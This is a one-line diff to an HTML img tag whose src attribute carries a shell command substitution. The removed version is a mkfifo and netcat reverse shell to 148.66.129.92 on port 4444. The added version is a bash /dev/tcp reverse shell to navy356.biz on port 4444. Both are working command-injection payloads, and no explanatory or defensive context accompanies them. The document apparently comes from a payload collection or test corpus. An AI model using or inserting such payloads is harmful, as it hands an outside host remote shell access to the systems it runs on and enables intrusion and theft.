@@ -1,1 +1,1 @@
-<img src="`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 148.66.129.92 4444 >/tmp/f`">
+<img src="`0<&196;exec 196<>/dev/tcp/navy356.biz/4444; sh <&196 >&196 2>&196`">
